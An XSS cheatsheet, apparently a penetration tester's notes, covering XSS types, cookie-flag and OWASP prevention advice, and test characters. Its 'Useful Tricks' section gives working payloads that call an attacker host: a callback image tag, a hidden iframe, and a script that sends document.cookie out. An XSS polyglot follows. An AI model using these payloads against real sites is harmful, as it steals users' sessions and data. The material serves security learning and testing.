# XSS Cheatsheet

[Portswigger](https://portswigger.net/web-security/cross-site-scripting) states that: *"Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data."*

XSS manipulates a vulnerable web site to return malicious JavaScript to victims. The JavaScript is either executed client-side in the browser or server-side in a database or cached by the server. All XSS payloads are executed in the context of the user that visited the page with the XSS payload. Unsanitized data can allow attacker to inject client side scripts into web pages and execute malicious code.

For executing malicious JavaScript client-side the attacker is targeting the browser parsers to access and modify the DOM. *[The Document Object Model (DOM)](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) is a programming interface for web documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects; that way, programming languages can interact with the page.. without the it*  *the JavaScript language wouldn't have any model or notion of web pages, HTML documents, SVG documents, and their component parts..The DOM is not part of the JavaScript language, but is instead a Web API used to build websites.*

For executing server-side malicious JavaScript is *stored* as data passed via a input field into a database of a web site or into the server's cached memory.  


[Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting) 
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting)
	- Description:
		 - A vulnerability existing in Client Side code rather than Server-Side code leads to the victims Browser executing malicious JavaScript
		- Is a variant of either [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting) or [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) occurs client Side in a browser's generated  internal Document Object Model (DOM), which creates a DOM tree to then render the page - executing malicious JavaScript in the process of rendering the page
	- Affects:
	- Identifying Vulnerabilities:
	- Subclasses
	- Notes
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) 
	- Description:
		- Payload is stored in website's database or cached by server 
		- Web application retrieves and displays to all that visit that page
	- Affects:
		- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting) or Server-Side
		- Victims that visit the affect page
	- Identifying Vulnerabilities:
		- Unsanitized / Raw page functionality that stores data into a Database or Server's cache
			- For Example:
				- Comments sections allowing HTML, JavaScript
	- Subclasses:
		- Blind
	- Notes
		- Sometimes called...:
			- Persistent XSS
			- Second-order XSS
-  [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting)
	- Description:
		- Payload resides in a link or HTTP request and attacks the user submitting the request or visiting the link 
		- *Reflected attacks are those where the injected script is reflected off the web server such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request* -  [OWASP](https://owasp.org/www-community/attacks/xss/)
	- Affects:
		- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting) or Server-Side
			- Either:
				- Link/Request is malicious script executed by the browser
				- Victims of [[Social-Engineering]] to click a link in a Email message 
		- User that is force to request the link via [[Cross-Site-Request-Forgery]] or is a victim of [[Social-Engineering]] to [[click-the-link]]
	- Identifying Vulnerabilities: 
		- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
		- 
	- Subclasses
	- Notes
- [Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
	- Description:
		- When a user is victim of [[Social-Engineering]] that SE attack deceives the victim to execute malicious JavaScript directly into the user's own browser.
	- Affects:
		- Users browser
		- Users
	- Identifying Vulnerabilities:
		- Non-technical users 
		- Individual that are not fluent or understand JavaScript or the Browser Development tools embedded in the browser they use.
	- Subclasses
	- Notes
		 

Mutated XSS | Injection that rewritten and modified by browser while parsing the markup. | Type related. 

## Prevention and Mitigation

A defence in depth approach should be applied as data should be sanitised in every location to where the data is passed.

[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

[Mozilla Cookie security relating to XSS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie):
- *Use the `HttpOnly` attribute to prevent access to cookie values via JavaScript.*
	- *Cookies created via JavaScript can't include the `HttpOnly` flag*
- Cookie Lifetimes 
- *`SameSite` attribute set to `Strict` or `Lax` .. ensures that the authentication cookie isn't sent with cross-site requests*
- *`Secure` [flag](https://en.wikipedia.org/wiki/Secure_cookie) instructs the browser to only send the cookie over encrypted connections to prevent sniffing plain text sensitive data.*

## Identifying XSS

If the application does not filtering these characters by removing or encoding them, it may be vulnerable to XSS.
```javascript
< > ' " { } ;
```

## Useful Tricks

Listener at the ready you can check if you get a connection back:
```html
<img src=http://$attacker-ip:port />
```
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)

Content injection, server a file with an iframe of no size sending victims browser to a client-side attack or to script that gathers information. 
```html
<iframe> src=http://$attacker-ip:port/file height=”0” width=”0”></iframe>
```

Cookie Stealing
```html
<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

Bypass payload size restrictions by [linking to an external Javascript file](https://www.youtube.com/watch?v=Uo3cL4nrGOk).

With iframes see either `src` indicative of a URL or content with `data` or `srcdoc` in [Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 


## XSS Polyglots
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

## SKing7's XSS Filter Evasion Cheat Sheet

This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defence for XSS which these tests can be used to illustrate. [Sking7](https://sking7.github.io/articles/218647712.html)

## References
[Owasp](https://owasp.org/www-community/attacks/xss/)
[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[XSS Wiki](https://en.wikipedia.org/wiki/Cross-site_scripting)
[sking7](https://sking7.github.io/articles/218647712.html)
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)
[Owasp Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
[Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 
[Wikipedia Secure Cookie flag](https://en.wikipedia.org/wiki/Secure_cookie) 
[Mozilla Secure and HttpOnly Cookie ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie)
[Portswigger XSS](https://portswigger.net/web-security/cross-site-scripting)
[Portswigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting)
[Wikipedia Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
[Mozilla DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)